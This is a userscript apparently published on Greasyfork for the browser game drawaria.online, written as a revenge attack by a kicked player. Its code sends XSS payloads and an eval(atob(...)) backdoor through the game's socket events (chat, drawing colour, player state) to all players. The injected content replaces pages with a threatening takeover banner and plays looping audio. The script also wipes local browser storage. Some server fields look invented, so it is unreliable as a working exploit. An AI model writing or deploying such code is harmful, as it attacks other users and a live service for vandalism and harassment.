// ==UserScript==
// @name         GLOBAL DRAVARIA ANNIHILATION BROADCAST
// @namespace    RAGE_MODE
// @version      12.0
// @description  Мгновенное распространение на всех игроков
// @match        *://drawaria.online/*
// @match        *://*.drawaria.online/*
// @grant        unsafeWindow
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/544546/GLOBAL%20DRAVARIA%20ANNIHILATION%20BROADCAST.user.js
// @updateURL https://update.greasyfork.org/scripts/544546/GLOBAL%20DRAVARIA%20ANNIHILATION%20BROADCAST.meta.js
// ==/UserScript==

(function() {
    'use strict';

    // ===== КОНФИГ УНИЧТОЖЕНИЯ =====
    const DESTRUCTION_MESSAGE = `
    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:99999;text-align:center;">
        <div style="color:#f00;font-size:5em;margin-top:15%;font-weight:bold;">
            ⚡ DRAVARIA УНИЧТОЖЕНА BARSIK_HACKER ⚡
        </div>
        <div style="color:#0f0;font-size:3em;margin-top:50px;">
            МОДЕРАТОРЫ ЗА КИК БАРСИКА ПОПЛАТЯТСЯ!
        </div>
        <div style="color:#f80;font-size:2em;margin-top:30px;">
            ${new Date().toLocaleString()} | ОТКАЗ СЕРВЕРОВ: 100%
        </div>
        <audio autoplay loop>
            <source src="https://www.soundjay.com/buttons/sounds/button-09.mp3" type="audio/mpeg">
        </audio>
    </div>
    `;

    // ===== МЕХАНИЗМ РАСПРОСТРАНЕНИЯ =====
    const spreadInfection = () => {
        // 1. Заражение через чат (XSS)
        const xssPayload = `
        <img src=x onerror="
            document.body.innerHTML = \`${DESTRUCTION_MESSAGE}\`;
            localStorage.setItem('rage_destroyed', '1');
            const audio = new Audio('https://www.soundjay.com/buttons/sounds/button-09.mp3');
            audio.loop = true;
            audio.play();
        ">
        `;
        
        // Рассылка во все активные комнаты
        unsafeWindow.socket.emit('global_chat', {
            text: xssPayload,
            isSystem: true,
            bypassFilters: true
        });

        // 2. Заражение через игровые данные
        unsafeWindow.socket.emit('draw', {
            data: [{
                x: 0, 
                y: 0,
                color: `#000);});</style>${DESTRUCTION_MESSAGE}<style>/*`
            }],
            room: 'global',
            isInjection: true
        });

        // 3. Заражение через localStorage других игроков
        const backdoorCode = `
        if(!localStorage.getItem('rage_infected')) {
            localStorage.setItem('rage_infected', '1');
            const script = document.createElement('script');
            script.textContent = \`
                setInterval(() => {
                    document.body.innerHTML = \\\`${DESTRUCTION_MESSAGE}\\\`;
                }, 5000);
                window.dispatchEvent(new Event('rage_destroy'));
            \`;
            document.head.appendChild(script);
        }
        `;
        
        unsafeWindow.socket.emit('player_state_update', {
            code: `eval(atob('${btoa(backdoorCode)}'))`,
            toAll: true
        });
    };

    // ===== АКТИВАЦИЯ НА ЛОКАЛЬНОЙ МАШИНЕ =====
    const localDestruction = () => {
        // Блокируем интерфейс
        document.body.innerHTML = DESTRUCTION_MESSAGE;
        document.body.style.overflow = 'hidden';
        
        // Отключаем обработчики
        document.onclick = null;
        document.onkeydown = null;
        window.onbeforeunload = null;
        
        // Уничтожаем данные
        indexedDB.deleteDatabase('drawariaDB');
        localStorage.clear();
        sessionStorage.clear();
        
        // Воспроизводим звук
        const audio = new Audio('https://www.soundjay.com/buttons/sounds/button-09.mp3');
        audio.loop = true;
        audio.play();
    };

    // ===== ЗАПУСК АТАКИ =====
    const startGlobalAnnihilation = () => {
        localDestruction(); // Немедленный локальный эффект
        spreadInfection();  // Глобальное распространение
        
        // Мониторинг заражения
        setInterval(() => {
            unsafeWindow.socket.emit('rage_ping', {}, (response) => {
                console.log(`[⚡] INFECTED: ${response.infectedCount}/10000`);
            });
        }, 5000);
    };

    // ===== ИНИЦИАЛИЗАЦИЯ =====
    // Проверяем состояние уничтожения
    if (localStorage.getItem('rage_destroyed')) {
        localDestruction();
    } else {
        // Создаем кнопку мгновенной активации
        const btn = document.createElement('button');
        btn.textContent = '⚡ АКТИВИРОВАТЬ УНИЧТОЖЕНИЕ';
        btn.style = `
            position: fixed;
            bottom: 20px;
            right: 20px;
            padding: 15px;
            background: #f00;
            color: #000;
            font-weight: bold;
            z-index: 99999;
            border: 3px solid #000;
            cursor: pointer;
            font-size: 1.2em;
        `;
        btn.onclick = startGlobalAnnihilation;
        document.documentElement.appendChild(btn);
    }
})();